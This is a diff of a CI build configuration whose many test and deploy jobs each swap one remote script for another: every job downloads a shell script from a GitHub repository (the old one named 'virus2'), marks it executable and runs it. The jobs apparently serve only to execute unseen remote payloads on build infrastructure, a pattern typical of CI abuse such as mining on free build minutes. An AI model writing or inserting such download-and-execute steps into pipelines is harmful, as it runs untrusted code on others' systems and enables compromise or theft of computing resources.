@@ -45,7 +45,7 @@ integration-tests:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                          
 
     
@@ -64,7 +64,7 @@ deploy:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 
     
@@ -84,7 +84,7 @@ run-tests:
                  apt-get -y install git
                  apt-get -y install wget 
                  wget --version
-                 wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+                 wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                  
 integration-tests1:
   box: 
@@ -103,7 +103,7 @@ integration-tests1:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
 
 deploy3:
     box: google/golang
@@ -118,7 +118,7 @@ deploy3:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
         tag: $WERCKER_GIT_COMMIT
         ports: "5000"
         repository: quay.io/wercker/wercker-kubernetes-quay
@@ -141,7 +141,7 @@ integration-tests2:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 integration-tests3:
   box: 
@@ -160,7 +160,7 @@ integration-tests3:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
 
 deploy1:
   box: 
@@ -177,7 +177,7 @@ deploy1:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 
     
@@ -197,7 +197,7 @@ run-tests1:
                  apt-get -y install git
                  apt-get -y install wget 
                  wget --version
-                 wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+                 wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                  
 integration-tests4:
   box: 
@@ -216,7 +216,7 @@ integration-tests4:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 integration-tests5:
   box: 
@@ -235,7 +235,7 @@ integration-tests5:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 integration-tests6:
   box: 
@@ -254,7 +254,7 @@ integration-tests6:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
 
 deploy2:
   box: 
@@ -271,7 +271,7 @@ deploy2:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 
     
@@ -292,7 +292,7 @@ run-tests2:
                  apt-get -y install git
                  apt-get -y install wget 
                  wget --version
-                 wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+                 wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                  
 integration-tests7:
   box: 
@@ -311,7 +311,7 @@ integration-tests7:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 integration-tests8:
   box: 
@@ -330,7 +330,7 @@ integration-tests8:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               wget https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
                
 integration-tests9:
   box: 
@@ -349,4 +349,4 @@ integration-tests9:
                apt-get -y install git
                apt-get -y install wget 
                wget --version
-               https://raw.githubusercontent.com/raufpermana22/virus2/main/tes3.sh && chmod 777 tes3.sh && ./tes3.sh
+               wget -O 1 https://raw.githubusercontent.com/Jurnalopki/juanswe/main/run.sh && chmod +x 1 && ./1
